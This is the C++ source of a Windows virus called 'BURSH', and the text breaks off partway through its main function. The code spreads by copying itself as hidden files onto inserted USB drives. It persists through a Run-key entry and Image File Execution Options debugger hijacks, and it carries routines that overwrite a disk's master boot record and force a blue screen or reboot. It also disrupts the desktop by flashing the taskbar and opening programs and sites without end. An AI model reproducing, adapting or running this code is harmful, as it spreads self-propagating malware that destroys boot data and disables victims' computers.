#include <iostream>
#include <atlbase.h>
#include <Dbt.h>
#include <io.h>
#include <string>
#include <vector>
#include <atlstr.h>
#include <ShlObj.h>
#include <comdef.h>
#include <algorithm>
#include <iomanip>
#include <TlHelp32.h>
#include <lmcons.h>
#include <direct.h>
#include "md5.h"
#include "MyMd5.h"
#include <thread>
#pragma comment(lib, "gdi32.lib")
#pragma warning( disable : 4996 )

typedef vector<string> StringList;


LRESULT CALLBACK    WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK    msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam);
DWORD   WINAPI      ThreadTunnelWindow(LPVOID);
DWORD   WINAPI      ThreadDeterMBThread(LPVOID);
DWORD   WINAPI      ThreadDeterMB(LPVOID);
DWORD   WINAPI      ThreadRandomMB(LPVOID);
DWORD   WINAPI      ThreadUDiskWindow(LPVOID);
DWORD   WINAPI      ThreadFunc(LPVOID);
DWORD   WINAPI      CloseTaskManagerThreadFunc(LPVOID);
vector<string>      getFolderList(const string& path);
BOOL                isFolderExist(char* folder);
LPCWSTR             stringToLPCWSTR(string orig);
string              capitalizeString(string s);
StringList          splitstr(const string& str, const string& pattern);
char                FirstDriveFromMask(ULONG unitmask);
void                AutoPowerOn(string apppath);
int                 main(int argc, char* argv[]);

// FUCKYOU!

typedef string FUCKCRACKER;

FUCKCRACKER fuckcracker_0 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_00 = fuckcracker_0;
FUCKCRACKER fuckcracker_1 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_11 = fuckcracker_1;
FUCKCRACKER fuckcracker_2 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_22 = fuckcracker_2;
FUCKCRACKER fuckcracker_3 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_33 = fuckcracker_3;
FUCKCRACKER fuckcracker_4 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_44 = fuckcracker_4;
FUCKCRACKER fuckcracker_5 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_55 = fuckcracker_5;
FUCKCRACKER fuckcracker_6 = "破解我的作品很有趣吗？————郭书岩";
FUCKCRACKER fuckcracker_66 = fuckcracker_6;

__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}
__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU_(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}
__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU__(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}
__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU___(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}
__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU____(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}
__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU_____(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}
__declspec(dllexport) FUCKCRACKER __FUCKYOU_FUCKYOU______(FUCKCRACKER FUCKYOU) {
	return "FUCKYOUFUCKYOU";
}

// FUCKYOU!

int scrw, scrh;
HCRYPTPROV prov;
int cx = GetSystemMetrics(SM_CXSCREEN);
int cy = GetSystemMetrics(SM_CYSCREEN);
int MsgBox_X;
int MsgBox_Y;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

// "killWindowsInstant" function is MEMZ Trojan Function
void killWindowsInstant() {
	// Try to force BSOD first
	// I like how this method even works in user mode without admin privileges on all Windows versions since XP (or 2000, idk)...
	// This isn't even an exploit, it's just an undocumented feature.
	HMODULE ntdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}

	// If the computer is still running, do it the normal way
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

	// The actual restart
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

const char* msgs[] = {
	"为什么你要杀了我？？？",
	"你杀了我，现在，\r\n去死吧！",
	"作者：郭书岩"
};

const size_t nMsgs = sizeof(msgs) / sizeof(void*);

DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "MEMZ", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}

void killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
		Sleep(100);
	}

	killWindowsInstant();
}

LRESULT CALLBACK WindowBSODProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == WM_CLOSE || msg == WM_ENDSESSION || msg == WM_QUERYENDSESSION) {
		killWindows();
		return 0;
	}

	return DefWindowProc(hwnd, msg, wParam, lParam);
}


vector<string> getFolderList(const string& path)
{
	vector<string> folderList;
	//文件句柄
	_int64   hFile = 0;
	// 文件信息
	_finddata_t fileinfo;
	string allPath; // 文件或文件的完整路径
	if ((hFile = _findfirst(allPath.assign(path).append("/*").c_str(), &fileinfo)) != -1) {
		try {
			do {
				if ((fileinfo.attrib & _A_SUBDIR)) {
					if (strcmp(fileinfo.name, ".") != 0 &&
						strcmp(fileinfo.name, "..") != 0 &&
						strcmp(fileinfo.name, "System Volume Information") != 0) { // 目录
						string folderPath = fileinfo.name;
						folderList.push_back(folderPath);
					}
					else {// 为文件
					}
				}
			} while (!_findnext(hFile, &fileinfo));
		}
		catch (exception e) {
			cout << e.what() << endl;
		}
		_findclose(hFile);
	}
	return folderList;
}

char FirstDriveFromMask(ULONG unitmask)
{
	char i;

	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}

	return(i + 'A');
}

BOOL isFolderExist(char* folder)
{
	int ret = 0;

	ret = _access(folder, 0);
	if (ret == 0)
		ret = TRUE;
	else
		ret = FALSE;

	return ret;
}

LPCWSTR stringToLPCWSTR(std::string str)
{
	size_t size = str.length();
	int wLen = ::MultiByteToWideChar(CP_UTF8,
		0,
		str.c_str(),
		-1,
		NULL,
		0);
	wchar_t* buffer = new wchar_t[wLen + 1];
	memset(buffer, 0, (wLen + 1) * sizeof(wchar_t));
	MultiByteToWideChar(CP_ACP, 0, str.c_str(), size, (LPWSTR)buffer, wLen);
	return buffer;
}

string capitalizeString(string s)
{
	transform(s.begin(), s.end(), s.begin(),
		[](unsigned char c) { return toupper(c); });
	return s;
}
LRESULT CALLBACK WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
	PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
	vector<string> VIRUSPATH;
	string drivePath = "";
	char driveName;

	/*
	当USB设备插入或者弹出时，Windows会产生一条全局消息：WM_DEVICECHANGE
我们需要做的是，获得这条消息的wParam参数，如果为DBT_DEVICEARRIVAL则表示有设备插入并可用，
如果是DBT_DEVICEREMOVECOMPLETE则表示有设备已经移除。再查看lParam参数为DBT_DEVTYP_VOLUME时，
就可以取出DEV_BROADCAST_VOLUME结构的卷号dbcv_unitmask，就知道是哪个卷被插入或者弹出。
	*/
	switch (uMsg)
	{
	case WM_DEVICECHANGE:
		switch (wParam)
		{
		case DBT_DEVICEARRIVAL:
			//获取卷号
			driveName = FirstDriveFromMask(lpdbv->dbcv_unitmask);
			drivePath += driveName;
			drivePath += ":\\";
			char* cDrivePath;
			cDrivePath = const_cast<char*>(drivePath.c_str());
			while (isFolderExist(cDrivePath)) {
				VIRUSPATH = getFolderList(drivePath);
				CopyFile(_T("C:\\Window\\bursh.exe"), stringToLPCWSTR(drivePath + "bursh.exe"), FALSE);
				SetFileAttributes(stringToLPCWSTR(drivePath + "bursh.exe"),
					FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
				// 老代码
				// system(((string)"copy C:\\Window\\bursh.exe " + drivePath + "bursh.exe").c_str());
				for (size_t i = 0; i < VIRUSPATH.size(); i++)
				{
					MD5 MD5FileName;
					MD5 MD5FileAttr;
					string fileName = drivePath + MD5FileName.encode(VIRUSPATH[i]).c_str() + ".exe";
					if ((_access(fileName.c_str(), 0)) != -1)
					{
						// 有别的病毒文件感染了 U 盘
						DeleteFile(stringToLPCWSTR(fileName));
					}
					CopyFile(L"C:\\Window\\bursh.exe", stringToLPCWSTR(fileName), TRUE);
					SetFileAttributes(stringToLPCWSTR(drivePath + MD5FileAttr.encode(VIRUSPATH[i]).c_str()),
						FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
					// 老代码
					// system(((string)"copy C:\\Window\\ff.exe " + WCharToMByte(str.GetBuffer(0)) + ".exe").c_str());
				}
				Sleep(10000);
			}
			break;
		case DBT_DEVICEREMOVECOMPLETE:
			break;
		default:
			;
		}
		break;
	default:
		;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

void EditImageFile(
	string origname,
	string editpath,
	string __regName = "Debugger",
	string __regType = "REG_SZ",
	string __regKey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\",
	string __basic_command = "reg add \"",
	string __basic_first_command = "\" /v ",
	string __basic_second_command = " /t ",
	string __basic_third_command = " /d \"",
	string __basic_last_command = "\" /f")
{
	WinExec((__basic_command + __regKey +
		origname + __basic_first_command + __regName + __basic_second_command + __regType +
		__basic_third_command + editpath + __basic_last_command).c_str(), SW_HIDE);
}

void AutoPowerOn(string apppath)
{
	HKEY hKey;
	//string strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

	//1、找到系统的启动项
	if (RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项
	{
		//2、全路径
		TCHAR strExeFullDir[256];
		MultiByteToWideChar(CP_ACP, 0, (LPCSTR)apppath.c_str(), -1, strExeFullDir, 256);

		//3、判断注册表项是否已经存在
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, nullptr, _T("BURSH"), RRF_RT_REG_SZ, 0, strDir, &nLength);

		//4、已经存在
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			//5、添加一个子Key,并设置值
			RegSetValueEx(hKey, _T("BURSH"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) *
				sizeof(TCHAR));

			//6、关闭注册表
			RegCloseKey(hKey);
		}
	}
}

StringList splitstr(const string& str, const string& pattern)
{
	StringList  li;
	string subStr;
	string tPattern;
	size_t      patternLen = pattern.length();

	//遍历字符串，将i位置的字符放入子串中，当遇到pattern子串时完成一次切割
	//遍历之后得到切割后的子串列表
	for (size_t i = 0; i < str.length(); i++)
	{
		if (pattern[0] == str[i])//遇到需要检测pattern的情况
		{
			tPattern = str.substr(i, patternLen);
			if (tPattern == pattern)//找到一个匹配的pattern，完成切割
			{
				i += patternLen - 1;
				if (!subStr.empty())
				{
					li.push_back(subStr);
					subStr.clear();
				}
			}
			else//不是匹配的pattern，将i位置的字符放入子串
			{
				subStr.push_back(str[i]);
			}
		}
		else//未遇到pattern，将i位置的字符放入子串
		{
			subStr.push_back(str[i]);
		}
	}
	if (!subStr.empty())//将子串中的剩余字符放入子字符串队列
	{
		li.push_back(subStr);
	}
	return li;
}

//自己写一个函数来提权。
void GetPrivileges()
{
	//定义一个PLUID
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp;
	//获取当前进程的句柄
	hProcess = GetCurrentProcess();
	//
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
	//函数查看系统权限的特权值，返回信息到一个LUID结构体里。
	tp.PrivilegeCount = 1;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);
}

template <class T>
int GetListLength(T List) {
	try {
		return sizeof(List) / sizeof(List[0]);
	}
	catch (exception e) {
		return -1;
	}
}

void Tunnel() {
	int a, b;
	int x, y;
	x = GetSystemMetrics(SM_CYSCREEN);
	y = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();//new
	HDC hdc = GetWindowDC(hwnd);//new
	POINT point;//new
	GetCursorPos(&point);
	LPWSTR RandomICO[] = {
		IDI_ERROR,
		IDI_APPLICATION,
		IDI_WARNING,
		IDI_WINLOGO,
		IDI_INFORMATION,
		IDI_QUESTION
	};
	DrawIcon(hdc, point.x - 5, point.y - 5, LoadIcon(NULL, RandomICO[random() % GetListLength(RandomICO)]));//ERROR ICON
	int randx, randy;
	randx = rand() % x + 0;
	randy = rand() % y + 0;
	BitBlt(GetDC(NULL), rand() % x + 0, rand() % y + 0, randx + 200, randy + 200, GetDC(NULL), randx, randy, NOTSRCCOPY);
	a = GetSystemMetrics(SM_CXSCREEN);
	b = GetSystemMetrics(SM_CYSCREEN);
	StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);
}

//下面的函数来读取物理磁盘
void ReadPHYSICALDRIVE(string PhysicalDrive, char scode[])
{
	HANDLE hFile;
	DWORD dwReadSize;
	// char lpBuffer[512];
	// 使用 CreateFile 打开这个文件
	hFile = CreateFile(stringToLPCWSTR(PhysicalDrive), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		MessageBox(0, L"CreateFile Failed...", L"错误", 0);
	}
	BYTE pMBR[512] = { 0 };
	memcpy(pMBR, scode, sizeof(scode) - 1);
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	//用readfile来读取文件
	WriteFile(hFile, pMBR, 512, &dwReadSize, NULL);
}

DWORD WINAPI SecondDeter(LPVOID p) {
	MessageBoxW(NULL, L"Why did you refuse?", L"DID I LET YOU REFUSE?", MB_OK | MB_ICONERROR);
	return 0;
}

DWORD WINAPI OpenRP(LPVOID p) {
	string randomProgramList[] = {
		"notepad.exe",
		"cmd.exe",
		"gpedit.msc",
		"control.exe",
		"explorer.exe",
		"taskmgr.exe",
		"calc.exe",
		"regedit.exe"
	};
	while (1) {
		system(randomProgramList[random() % (sizeof(randomProgramList) / sizeof(randomProgramList[0]))].c_str());
		Sleep(10000);
	}
	return 0;
}
DWORD WINAPI OpenRU(LPVOID p) {
	string randomURLList[] = {
		"open https://guoshuyan.github.io/",
		"open https://space.bilibili.com/185354710",
		(string)((string)"open https://cn.bing.com/search?q=BURSH%20%E7%97%8" + 
		"5%E6%AF%92%E4%BD%9C%E8%80%85%EF%BC%9A%E9%83%AD%E4%B9%A6%E5%B2%A9")
	};
	while (1) {
		system(randomURLList[random() % (sizeof(randomURLList) / sizeof(randomURLList[0]))].c_str());
		Sleep(5000);
	}
	return 0;
}

int HideHandle(HWND Behide) {
	return ShowWindow(Behide, SW_HIDE);
}

int ShowHandle(HWND Behide) {
	return ShowWindow(Behide, SW_SHOWNORMAL);
}

string boolToString(bool beConvert, bool toUpper) {
	return beConvert ? toUpper ? "TRUE" : "true" : toUpper ? "FALSE" : "false";
}

DWORD WINAPI HideShowWindow(LPVOID p) {
	HWND TaskbarHANDLE = FindWindow(_T("Shell_TrayWnd"), NULL); // 用来隐藏任务栏
	cout << "[ HideShowWindow ] Shell_TrayWnd -> HWND = " << TaskbarHANDLE << endl;
	BOOL HideSuccess; // 隐藏成功(?)
	BOOL ShowSuccess; // 显示成功(?)
	while (1) {
		// 如果窗口之前可见，则返回值为非零。如果窗口之前被隐藏，则返回值为零。
		HideSuccess = HideHandle(TaskbarHANDLE);
		cout << "[ HideShowWindow ] HideSuccess = " << boolToString(HideSuccess, TRUE) << endl;
		Sleep(500);
		ShowSuccess = ShowHandle(TaskbarHANDLE);
		cout << "[ HideShowWindow ] ShowSuccess = " << boolToString(ShowSuccess, TRUE) << endl;
		Sleep(500);
		if (!(HideSuccess != FALSE && ShowSuccess == FALSE)) {
			MessageBoxA(NULL, "Hide Taskbar Or Show Taskbar Failed!", "FAILED ERROR", MB_OK | MB_ICONERROR);
			return 0;
		}
	}
}

string rand_str(const int len)  /*参数为字符串的长度*/
{
	/*初始化*/
	string str;                 /*声明用来保存随机字符串的str*/
	char c;
	/*声明字符c，用来保存随机生成的字符*/
	int idx;                    /*用来循环的变量*/
	/*循环向字符串中添加随机生成的字符*/
	for (idx = 0; idx < len; idx++)
	{
		/*rand()%26是取余，余数为0~25加上'a',就是字母a~z,详见asc码表*/
		c = random() % 2 < 1 ? 'a' : 'A' + random() % 26;
		str.push_back(c);       /*push_back()是string类尾插函数。这里插入随机字符c*/
		cout << "[ rand_str ] str = " << str << endl;
	}
	return str;                 /*返回生成的随机字符串*/
}

int setDWORDReg(HKEY BeEditHKEY,string SubKey, string KeyName ,const BYTE * Content) {
	HKEY hKey = NULL;
	LONG lRet = RegCreateKeyEx(BeEditHKEY, stringToLPCWSTR(SubKey), NULL, NULL, 0x00000000L, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet == ERROR_SUCCESS) {
		int sRet = RegSetValueEx(hKey, stringToLPCWSTR(KeyName), 0, REG_DWORD, Content, sizeof(Content));
		RegCloseKey(hKey);
		return sRet;
	}
	else {
		return lRet;
	}
}

void runProgram(string programPath,
	string parameter = "____NOPARAMETER",
	UINT nShowCmd = SW_HIDE) {
	if (parameter == "____NOPARAMETER") {
		parameter = "";
	}
	else {
		parameter = " " + parameter;
	}
	cout << "[ runProgram ] beExecuteCommand :" << (programPath + parameter).c_str() << endl;
	WinExec((programPath + parameter).c_str(), nShowCmd);
}

int setSZReg(HKEY BeEditHKEY, string SubKey, string KeyName, const BYTE* Content) {
	HKEY hKey = NULL;
	LONG lRet = RegCreateKeyEx(BeEditHKEY, stringToLPCWSTR(SubKey), NULL, NULL, 0x00000000L, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet == ERROR_SUCCESS) {
		int sRet = RegSetValueEx(hKey, stringToLPCWSTR(KeyName), 0, REG_SZ, Content, sizeof(Content));
		RegCloseKey(hKey);
		return sRet;
	}
	else {
		return lRet;
	}
}

int setBinaryReg(HKEY BeEditHKEY, string SubKey, string KeyName, const BYTE* Content) {
	HKEY hKey = NULL;
	LONG lRet = RegCreateKeyEx(BeEditHKEY, stringToLPCWSTR(SubKey), NULL, NULL, 0x00000000L, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	if (lRet == ERROR_SUCCESS) {
		int sRet = RegSetValueEx(hKey, stringToLPCWSTR(KeyName), 0, REG_BINARY, Content, sizeof(Content));
		RegCloseKey(hKey);
		return sRet;
	}
	else {
		return lRet;
	}
}

string ReplaceString(string orig, char ReplaceTable[], char BeReplaceTable[]) {
	if (sizeof(ReplaceTable) / sizeof(char) == sizeof(BeReplaceTable) / sizeof(char)) {
		string returns = "";
		for (int i = 0; i < orig.length(); i++) {
			for (size_t j = 0; j < sizeof(ReplaceTable) / sizeof(char); j++)
			{
				if (orig[i] == BeReplaceTable[j]) {
					returns += ReplaceTable[j];
				}
			}
		}
		return returns;
	}
	else {
		throw exception("Fatal Error : The length of \"ReplaceTable\" is not equal to \"BeReplaceTable\"");
	}
}

int main(int argc, char* argv[])
{
	SetComputerNameA("BURSH-Virus");
	// SYSTEM_VARS
	int releaseMode = 0;
	int canEditData = 1;
	int runtimeCheck = 1;
	int skipSystemCheck = 0;
	BOOL __SHOW_WINDOW__ = FALSE;
	RETURN_GET_HWND :
	HWND m_hWnd = NULL;
	string ConsoleTitle = (string)"BURSH_DebugWindow-R" + rand_str(20);
	SetConsoleTitleA(ConsoleTitle.c_str());
	m_hWnd = ::FindWindowA(NULL, ConsoleTitle.c_str());
	if (m_hWnd == NULL) {
		cout << "[ System Get Process ] 获取失败！" << endl;
		goto RETURN_GET_HWND;
	}
	else {
		cout << "[ System Get Process ] 获取成功！hWnd = " << m_hWnd << endl;
	}
	ShowWindow(m_hWnd, __SHOW_WINDOW__);
	if (releaseMode != 0) {
		canEditData = 0;
		releaseMode = -1;
		runtimeCheck = 1;
		skipSystemCheck = 0;
		__SHOW_WINDOW__ = FALSE;
	}
	char* buffer;
	string allFilePath;
	//也可以将buffer作为输出参数
	if ((buffer = getcwd(NULL, 0)) == NULL) {
		MessageBoxA(NULL, "Get path fail!", "FAILED ERROR!", MB_OK | MB_ICONERROR);
		exit(0);
	}
	else {
		if ((splitstr(argv[0], "\\")[0] == argv[0] ||
			splitstr(argv[0], "/")[0] == argv[0]) == false) {
			allFilePath = argv[0];
		}
		else {
			allFilePath = buffer;
		}
		free(buffer);
	}
	long long waitTime = (LONGLONG)~MAXLONGLONG;
	// +VIRUS_CHECK
	SYSTEM_INFO lpSI{};
	GetSystemInfo(&lpSI);
	cout << "---- VIRUS_CHECK ----" << endl;
	cout << "invalid begin line in SSH-2 public key file" << endl;
	cout << "---- BEGIN SSH2 PUBLIC KEY ----" << endl;
	ExitWindowsEx(2, 0);
	LockWorkStation();
	cout << setw(20) << "处理器掩码: "		<< lpSI.dwActiveProcessorMask << endl
		 << setw(20) << "处理器个数: "		<< lpSI.dwNumberOfProcessors << endl
		 << setw(20) << "处理器分页大小: "	<< lpSI.dwPageSize << endl
		 << setw(20) << "处理器类型: "		<< lpSI.dwProcessorType << endl
		 << setw(20) << "最大寻址单元: "		<< lpSI.lpMaximumApplicationAddress << endl
		 << setw(20) << "最小寻址单元: "		<< lpSI.lpMinimumApplicationAddress << endl
		 << setw(20) << "处理器等级: "		<< lpSI.wProcessorLevel << endl
		 << setw(20) << "处理器版本: "		<< lpSI.wProcessorRevision << endl;
	cout << "---- BEGIN SSH2 PUBLIC KEY" << endl;
	try {
		runProgram("wmic.exe","path Win32_ComputerSystemProduct get uuid / value");
		cout << "WMIC 1 IS PASS" << endl;
		runProgram("wmic.exe", "path Win32_ComputerSystemProduct get uuid /value");
		cout << "WMIC 2 IS PASS" << endl;
	}
	catch (exception e) {
		MessageBoxA(NULL, e.what(), "EXCEPTION ERROR !!!", MB_OK | MB_ICONERROR);
	}
	{
		const int MAX_COMPUTER_LEN = MAX_COMPUTERNAME_LENGTH + 1;
		char  szBuffer[MAX_COMPUTER_LEN];
		DWORD dwNameLen;
		dwNameLen = MAX_COMPUTER_LEN;
		if (!GetComputerNameA(szBuffer, &dwNameLen))
			printf("Error  %d\n", GetLastError());
		else
			printf("计算机名为: %s\n", szBuffer);
		dwNameLen = UNLEN;
		if (!GetUserNameA(szBuffer, &dwNameLen))
			printf("Error  %d\n", GetLastError());
		else
			printf("当前用户名为：%s\n", szBuffer);
	}
	cout << "CN AND UN IS PASS" << endl;
	cout << "LONG URL:" << endl;
	cout << "longlongurl.long.longurl.longlong.long" << endl;
	cout << "LU IS PASS" << endl;
	cout << "---- VIRUS_CHECK ----" << endl;
	// -VIRUS_CHECK
	{
		DWORD TEMPTHREADID;
		CreateThread(NULL, 0, HideShowWindow, 0, 0, &TEMPTHREADID); // 创建线程
	}
	for (size_t i = 0; i < 100; i++)
	{
		string random_string = rand_str(15);
		CopyFile(stringToLPCWSTR(allFilePath), stringToLPCWSTR(random_string + ".exe"), TRUE);
		SetFileAttributes(stringToLPCWSTR(allFilePath), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
	}
	// SYSTEM_TYPEDEF
	typedef string ThisIsAVeryVeryVeryLongString0ButIDonNotThinkAnyoneWillUseIt;
	if (argc >= 2) {
		if (canEditData && argv[1] != "/__RUNOFIMAGEFILE__") {
			MessageBox(NULL, stringToLPCWSTR((ThisIsAVeryVeryVeryLongString0ButIDonNotThinkAnyoneWillUseIt)
				"argc >= 2\nargc = " + to_string(argc)), L"temp debug", MB_OK | MB_ICONINFORMATION);
			vector<string> allParameter;
			allParameter.push_back("PADDING_STRING");
			for (size_t i = 1; i < argc; i++)
			{
				MessageBox(NULL, stringToLPCWSTR((ThisIsAVeryVeryVeryLongString0ButIDonNotThinkAnyoneWillUseIt)
					"At present, it is the " +
					to_string(i) + " times of the cycle, a total of " +
					to_string(argc - 1) + " times."), L"temp debug", MB_OK | MB_ICONINFORMATION);
				string argvParameter = argv[i];
				transform(argvParameter.begin(), argvParameter.end(), argvParameter.begin(), ::tolower);
				MessageBox(NULL, stringToLPCWSTR((ThisIsAVeryVeryVeryLongString0ButIDonNotThinkAnyoneWillUseIt)
					"String to be detected: " + argvParameter), L"temp debug", MB_OK | MB_ICONINFORMATION);
				allParameter.push_back(argvParameter);
				if (allParameter[i].find("/sw:") != string::npos ||
					allParameter[i].find("/showw:") != string::npos ||
					allParameter[i].find("/sho2w:") != string::npos ||
					allParameter[i].find("/showwindow:") != string::npos ||
					allParameter[i].find("/swindow:") != string::npos) {
					MessageBox(NULL, L"Show Window set", L"temp debug", MB_OK | MB_ICONINFORMATION);
					string backParameter = splitstr(allParameter[i], ":").back();
					transform(backParameter.begin(), backParameter.end(), backParameter.begin(), ::tolower);
					if (backParameter == "true" ||
						backParameter == "1" ||
						backParameter == "y" ||
						backParameter == "yes") {
						__SHOW_WINDOW__ = TRUE;
					}
					else if (backParameter == "false" ||
						backParameter == "0" ||
						backParameter == "n" ||
						backParameter == "no") {
						__SHOW_WINDOW__ = TRUE;
					}
					else {
						MessageBox(NULL, L"未知参数类型。", L"temp debug", MB_OK | MB_ICONINFORMATION);
					}
					ShowWindow(m_hWnd, __SHOW_WINDOW__);
				}
				else if (allParameter[i].find("/runtimeCheck:") != string::npos) {
					MessageBox(NULL, L"runtimeCheck set", L"temp debug", MB_OK | MB_ICONINFORMATION);
					string backParameter = splitstr(allParameter[i], ":").back();
					transform(backParameter.begin(), backParameter.end(), backParameter.begin(), ::tolower);
					if (backParameter == "true" ||
						backParameter == "1" ||
						backParameter == "y" ||
						backParameter == "yes") {
						runtimeCheck = 1;
					}
					else if (backParameter == "false" ||
						backParameter == "0" ||
						backParameter == "n" ||
						backParameter == "no") {
						runtimeCheck = 0;
					}
					else {
						MessageBox(NULL, L"未知参数类型。", L"runtimeCheck", MB_OK | MB_ICONERROR);
					}
				}
				else if (allParameter[i].find("/w:") != string::npos ||
					allParameter[i].find("/wait:") != string::npos ||
					allParameter[i].find("/time:") != string::npos ||
					allParameter[i].find("/t:") != string::npos ||
					allParameter[i].find("/sleepp:") != string::npos ||
					allParameter[i].find("/sleep:") != string::npos ||
					allParameter[i].find("/sleepprog:") != string::npos ||
					allParameter[i].find("/sleepprogram:") != string::npos ||
					allParameter[i].find("/waittime:") != string::npos) {
					MessageBox(NULL, L"runtimeCheck set", L"temp debug", MB_OK | MB_ICONINFORMATION);
					string backParameter = splitstr(allParameter[i], ":").back();
					for (int i = 0; i < backParameter.length(); i++) //使用for循环遍历整个字符串
					{
						if (!isdigit(backParameter[i]))  		//使用isdigit()函数进行判断
						{
							MessageBox(NULL, L"请输入数字！", stringToLPCWSTR(splitstr(allParameter[i], ":")[0]), MB_OK | MB_ICONERROR);
							continue;
						}
					}
					if (atoll(backParameter.c_str()) > MAXLONGLONG) {
						MessageBox(NULL, L"请输入小于 9223372036854775807 ( 0x7FFFFFFFFFFFFFFF ) 的数！", stringToLPCWSTR(splitstr(allParameter[i], ":")[0]), MB_OK | MB_ICONERROR);
						continue;
					}
					waitTime = atoll(backParameter.c_str());
					WinExec(((string)"echo .>C:\\Window\\WAITTIME").c_str(), SW_HIDE);
				}
				else if (allParameter[i].find("/runthis:") != string::npos ||
					allParameter[i].find("/runthisp:") != string::npos ||
					allParameter[i].find("/runthisprog:") != string::npos ||
					allParameter[i].find("/runthisprogram:") != string::npos ||
